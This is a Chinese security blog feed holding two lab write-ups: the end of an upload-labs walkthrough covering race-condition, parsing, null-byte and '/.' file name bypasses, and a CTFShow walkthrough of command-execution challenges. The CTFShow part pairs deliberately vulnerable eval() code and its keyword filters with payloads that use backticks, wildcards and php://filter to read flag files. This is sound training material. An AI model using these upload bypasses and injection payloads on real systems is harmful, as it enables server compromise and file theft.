<p>Step2：接下来设置访问请求，浏览器构造请求url：<code>http://127.0.0.1/upload-labs-master/upload/miracle778.php</code>,进行访问，然后用burp抓包后发送至intruder模块，设置payload，这一步和上传请求设置差不多，都是Null payloads、5000次、50个线程。</p>
<p>Step3：设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202153511.png" alt=""></p>
<h3 id="Pass-18-利用竞争条件-解析漏洞绕过">Pass-18 利用竞争条件+解析漏洞绕过</h3>
<p>myupload.php中保存文件的路径的代码是写得有点问题的，并不会将文件保存在upload目录中，原因是保存路径的字符串在拼接时少了个斜杠/，因此可自行在myupload.php的setDir()函数中将cls_upload_dir变量对应的语句加个斜杠即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;cls_upload_dir = $dir.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="代码-v17">代码</h4>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>myupload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line">	</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v17">绕过方式</h4>
<p>审计给出来的代码，看到有个条件竞争问题，即程序先上传文件再重命名文件， 但如果只能上传图像文件而没有文件包含漏洞也不能getshell，但是后缀名过滤的白名单中包含了zip、7z、rar等Apache不能解析的后缀名，所以我们可以利用竞争条件+解析漏洞绕过。</p>
<p>利用过程和Pass-17一样，只是这次上传的文件后缀是<code>.php.7z</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202164723.png" alt=""></p>
<h3 id="Pass-19-利用-绕过">Pass-19 利用\.绕过</h3>
<h4 id="代码-v18">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里关于pathinfo的说明如下图：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202165613.png" alt=""></p>
<h4 id="绕过方式-v18">绕过方式</h4>
<p>文件名是通过POST方式传入的，然后通过黑名单过滤文件后缀名，最后直接用文件名拼接保存的文件路径上传上去。这关的绕过方法就很多了：</p>
<ul>
<li>0x00截断</li>
<li>点绕过</li>
<li><code>::$DATA</code>绕过</li>
<li>空格绕过</li>
<li>大小写绕过</li>
<li>Apache解析漏洞绕过</li>
</ul>
<p>这些都是之前关卡都用过的绕过方式，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的<code>/.</code>，所以可以构造<code>save_path=1.php/.</code>，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的<code>/.</code>可以实现保存文件为.php。</p>
<p>绕过文件名后缀：</p>
<ul>
<li>
<p>post: save_name = 1.php%00.jpg</p>
</li>
<li>
<p>post: save_name = 1.php/.、</p>
</li>
</ul>
<h3 id="Pass-20-数组-绕过">Pass-20 数组+\.绕过</h3>
<h4 id="代码-v19">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>reset()函数：将内部指针指向数组中的第一个元素，并输出。</li>
<li>end()函数：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</li>
<li>explode()函数：把字符串打散为数组。</li>
</ul>
<h4 id="绕过方式-v19">绕过方式</h4>
<p>先理清一下函数做了什么操作：</p>
<p>函数执行流程：文件名通过POST方式提交—&gt;MIME白名单校验—&gt;文件后缀白名单校验—&gt;获取文件名拼接到上传的路径。具体而言：</p>
<p>以POST方式上传save_name时，程序会将该参数作为文件名；接着判断该文件名参数save_name是否为数组，若不是则直接<code>.</code>来切分为数组形式；ext变量是调用end()函数取数组最后的一个元素的值，若文件名参数save_name不是数组当然是正常的后缀名，但是若文件名参数save_name是数组则取的就是save_name中最后一个元素值；ext和白名单判断过滤后，通过reset()函数获取文件名，若文件名参数save_name不为数组、此时当然就是正常的文件名，但若文件名参数save_name为数组，则是取save_name中第一个元素值；而最后上传文件的后缀名是直接拼接该语句的值<code>$file[count($file) - 1]</code>即将最后一个元素值作为后缀名。</p>
<p>分析到这里，绕过的关键思路就是：<code>end($file)</code>是jpg、png、gif，而<code>$file</code>最后一个元素是php。</p>
<p>这里可以构造<code>save_name[0] = 1.php/,save_name[2] = jpg</code>，这样的话end($file)为jpg，而<code>$file[count($file) - 1]</code>为$file[1]为空。所以最终<code>file_name=1.php/.</code>，到这里就跟Pass-19一样了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173551.png" alt=""></p>
<h2 id="文件上传漏洞总结">文件上传漏洞总结</h2>
<h3 id="漏洞类型分类">漏洞类型分类</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173811.png" alt=""></p>
<h3 id="漏洞类型判断方式">漏洞类型判断方式</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202173854.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<p>项目地址： <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<p><a href="mi1k7ea.com/2019/10/05/upload-labs-WriteUp/#0x14-Pass-20-%E6%95%B0%E7%BB%84-%E7%BB%95%E8%BF%87">Upload-labs WriteUp</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow-Web-Writeup</title>
    <url>/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="CTFShow-Web-Writeup">CTFShow Web Writeup</h1>
<h2 id="web入门-命令执行">web入门 命令执行</h2>
<h3 id="web29">web29</h3>
<p>考点：通配符绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;cat ????.php&#96;?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web30">web30</h3>
<p>考点：通配符绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;cat ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web31">web31</h3>
<p>考点：空格、通配符绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<p><code>&lt;?=</code>等价于 <code>&lt;?php echo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;more%09fla??ph?&#96;?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有一个奇怪的地方就是这里过滤我试了常见的绕过之后只能用%09</p>
</blockquote>
<h3 id="web32">web32</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个过滤确实是把👴给🤮到了，过滤了反引号不能直接执行命令，过滤了<code>(</code>不能直接使用函数，一直想另外引用一个GET参数，但是没能成功。</p>
<p>这道题的关键地方在于，PHP中不用括号的函数有<code>echo</code>和<code>include</code>和<code>require</code>，既然过滤了<code>echo</code>，那么就用其他两个。</p>
<p>此外过滤了<code>;</code>可以用<code>?&gt;</code>代替。</p>
<p>默认是没有回显的，可以使用PHP伪协议。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;require&quot;$_POST[1]&quot;?&gt;</span><br><span class="line"></span><br><span class="line">POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web33">web33</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里涉及到一个PHP特性，<code>echo</code>和<code>include</code>和<code>require</code>这三个函数直接后面跟<code>$</code>不会影响PHP语法。</p>
<p>所以直接把上面一道题的双引号去掉即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;require$_POST[1]?&gt;</span><br><span class="line"></span><br><span class="line">POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web34">web34</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>沿用上一个payload</p>
<h3 id="web35">web35</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续用上一个payload</p>
<h3 id="web36">web36</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把上面的payload稍加改造继续用。</p>
<h3 id="web37">web37</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
